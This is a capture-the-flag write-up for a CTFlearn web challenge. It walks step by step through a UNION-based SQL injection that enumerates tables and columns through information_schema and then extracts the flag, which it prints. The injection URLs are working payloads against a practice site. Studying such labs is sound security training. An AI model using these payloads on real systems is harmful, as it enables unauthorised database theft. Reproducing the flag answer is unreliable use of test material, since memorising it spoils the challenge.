# Inj3ction Time

## [CTFlearn Challenge](https://ctflearn.com/challenge/149)
<img src="inj3ction - solved.png">

## Solutions
### Step 1: 
The link included in the question brought me to a website, ```Dog Viewer```. 

### Step 2: 
I first tried inputting random numbers for ID. Strangely, I discovered that there will be no result shown when I entered any numbers other than 1, 2 and 3. 

When different numbers were input as ID, the URL changed. 
<img src="inj3ction - 1.png">

## Step 3: 
I tried UNION injection by modidying the URL. 

```https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,3,4```. 

The injection gave me the below output. 

<img src="inj3ction - 2.png">

Here we have 2 tables, one of which is the result of ```select 1,2,3,4```. UNION attacks basically injects the records from this table to the first table. This explains the output of the query. 

### Step 4: 
Now I knew I can get information about the database by modifying the second query. 

The ```INFORMATION_SCHEMA.TABLEs``` view allows us to get the information about tables and views within the database. The columns that this view returns include ```TABLE_CATALOG```, ```TABLE_SCHEMA```, ```TABLE_NAME``` and ```TABLE_TYPE```. In this instance, we only want it to return ```TABLE_NAME```. 

Also, we need to specify condition where ```TABLE_SCHEMA = database()```. ```DATABASE()``` returns the name of the current database, which is also refers to the schema. 

```https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema=database()```

<img src="inj3ction - 3.png">

### Step 5: 
From the output as shown above, the query exploited 2 tables, ```w0w_y0u_f0und_m3``` and ```webeight```. 

Now i tried to find out the column names by using similar concept above. 

```https://web.ctflearn.com/web8/?id=1%20union%20select%201,table_name,column_name,4%20from%20information_schema.columns%20where%20table_schema=database()```

<img src="inj3ction - 5.png">

### Step 6: 
The query in ```Step 5``` exploited one column, which is ```f0und_m3```. 

At this point, I had had enough information to leak the database to discover the flag. 

```https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,f0und_m3,4%20from%20w0w_y0u_f0und_m3```

<img src="inj3ction - 4.png">

### Step 7: 
Finally, the flag appeared! 

### Flag: 
```abctf{uni0n_1s_4_gr34t_c0mm4nd}```

## End Notes
This challenge is pretty complicated for beginners and I spent hours trying to figure out what the website do and how SQL Injection UNION attacks work. Fortunately, I have some immediate background of SQL so I was able to understand SQL queries and syntax effortlessly. Overall, the challenge is amazing. 